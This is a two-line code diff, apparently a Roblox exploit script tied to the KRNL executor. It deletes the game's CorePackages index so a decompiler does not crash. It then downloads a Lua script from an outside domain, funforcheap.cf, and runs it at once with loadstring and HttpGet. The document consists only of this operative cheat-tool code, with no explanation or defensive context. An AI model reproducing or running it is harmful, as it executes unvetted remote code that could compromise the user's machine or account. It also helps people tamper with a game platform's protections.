@@ -1,0 +1,2 @@
+game:GetService("CorePackages").Packages["_Index"]:destroy() -- KRNL Decompiler will crash otherwise.
+loadstring(game:HttpGet('https://funforcheap.cf/KRNL_Decompile_Console.txt'))()
